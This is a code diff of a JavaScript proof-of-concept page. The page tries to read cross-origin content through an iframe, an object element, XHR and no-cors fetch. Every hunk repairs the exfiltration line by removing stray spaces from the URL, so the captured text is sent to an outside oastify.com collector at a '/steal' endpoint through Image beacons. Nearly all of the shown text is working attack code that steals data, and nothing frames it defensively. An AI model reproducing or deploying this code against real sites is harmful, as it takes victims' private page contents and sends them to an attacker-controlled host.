@@ -19,7 +19,7 @@ ifr.onload = function() {
     var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
     log("[iframe] READ SUCCESS: " + txt.substring(0,200));
     // EXFILTRATE!
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=iframe&d=" + encodeURIComponent(txt);
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=iframe&d=" + encodeURIComponent(txt);
   } catch(e) {
     log("[iframe] blocked: " + e.message);
   }
@@ -38,7 +38,7 @@ obj.onload = function() {
     var doc = obj.contentDocument;
     var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
     log("[object] READ SUCCESS: " + txt.substring(0,200));
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=object&d=" + encodeURIComponent(txt);
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=object&d=" + encodeURIComponent(txt);
   } catch(e) {
     log("[object] blocked: " + e.message);
   }
@@ -73,7 +73,7 @@ xhr.open("GET", target, true);
 xhr.onload = function() {
   log("[xhr] status=" + xhr.status + " len=" + xhr.responseText.length);
   log("[xhr] READ SUCCESS: " + xhr.responseText.substring(0,200));
-  new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=xhr&d=" + encodeURIComponent(xhr.responseText);
+  new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=xhr&d=" + encodeURIComponent(xhr.responseText);
 };
 xhr.onerror = function() { log("[xhr] error (CORS)") };
 xhr.send();
@@ -87,7 +87,7 @@ fetch(target, {mode:"no-cors"}).then(function(r) {
   log("[fetch-nocors] text len=" + t.length);
   if(t.length > 0) {
     log("[fetch-nocors] READ SUCCESS: " + t.substring(0,200));
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=fetch&d=" + encodeURIComponent(t);
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=fetch&d=" + encodeURIComponent(t);
   }
 }).catch(function(e) {
   log("[fetch-nocors] error: " + e.message);
